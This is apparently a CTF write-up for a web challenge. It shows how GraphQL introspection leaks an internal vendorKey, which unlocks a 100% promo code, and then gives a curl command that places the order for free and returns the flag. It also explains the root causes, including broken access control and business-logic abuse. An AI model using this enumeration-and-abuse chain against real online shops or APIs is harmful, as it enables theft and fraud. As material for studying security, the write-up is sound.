# SunshineCTF 2026 — Used Goods of Tomorrow

## Challenge

**Category:** Web  
**Challenge:** Used Goods of Tomorrow  
**Flag format:** `sun{...}`

## Overview

The application is an online marketplace backed by a GraphQL API.

The goal is to obtain a restricted listing without paying its normal price. The interesting part of the challenge is that the GraphQL API exposes more information than the frontend requires, including internal vendor data and a promotional code.

## Recon

The target exposes a GraphQL endpoint:

```
POST /graphql
```

Schema introspection is enabled, so the available queries, mutations, arguments, and return types can be enumerated directly.

This immediately gives us a much clearer attack surface than trying to infer the API only from the frontend.

## GraphQL Enumeration

Introspection reveals a mutation named:

```
vendorTerminalSync
```

This mutation returns internal vendor information.

Calling it exposes a sensitive internal value:

```
VND-MASTER-21d5f80206dffb6fa9ad5722
```

The application is therefore leaking an internal `vendorKey` that should not be exposed to an unprivileged client.

## Finding the Promo Code

The schema also exposes:

```
promoCodes(vendorKey: ...)
```

Using the leaked vendor key reveals a promotional code associated with the target listing:

```
FOUNDERS-100
```

The code provides a 100% discount for Lot #4042.

At this point the attack chain becomes:

```text
GraphQL introspection
        |
        v
vendorTerminalSync
        |
        v
Leak internal vendorKey
        |
        v
promoCodes(vendorKey)
        |
        v
FOUNDERS-100
        |
        v
100% discount on Lot #4042
        |
        v
placeOrder()
        |
        v
FLAG
```

## Exploitation

The final order can be placed through the GraphQL mutation:

```bash
curl -s -X POST https://usedgoods.web.2026.sunshinectf.games/graphql \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <token>' \
  -d '{"query":"mutation { placeOrder(listingId:\"4042\", promoCode:\"FOUNDERS-100\") { success pricePaid flag } }"}'
```

The listing normally costs:

```
1,000,000 credits
```

With the leaked promotional code, the price becomes:

```
0 credits
```

The response then returns the flag.

## Root Cause

The challenge combines several weaknesses:

- GraphQL introspection exposed in the production application
- Sensitive internal information disclosure
- Missing authorization around vendor-specific data
- Trust in an internal `vendorKey` supplied through the API
- Business-logic abuse through an unrestricted promotional-code lookup

The key issue is not GraphQL itself. GraphQL introspection can be legitimate, but exposing sensitive operations and failing to enforce authorization on the data behind them creates the actual security problem.

## Classification

Relevant categories include:

- Information disclosure
- Broken access control
- GraphQL API security
- Business logic abuse
- Sensitive internal identifier exposure

There is no need to associate the challenge with a specific CVE.

## Final Flag

```
sun{1_l0v3_fr33_stuff}
```

## Takeaway

When testing a GraphQL application, introspection is often the fastest way to map the complete attack surface.

After enumeration, the important questions are:

1. Which mutations expose internal functionality?
2. Which arguments are security-sensitive?
3. Can an unprivileged user obtain internal identifiers?
4. Can those identifiers be chained into another query?
5. Can the resulting information be converted into a business-logic advantage?

Here, the vulnerability was not a single isolated endpoint. The flag came from chaining information disclosure, missing authorization, and business-logic abuse.
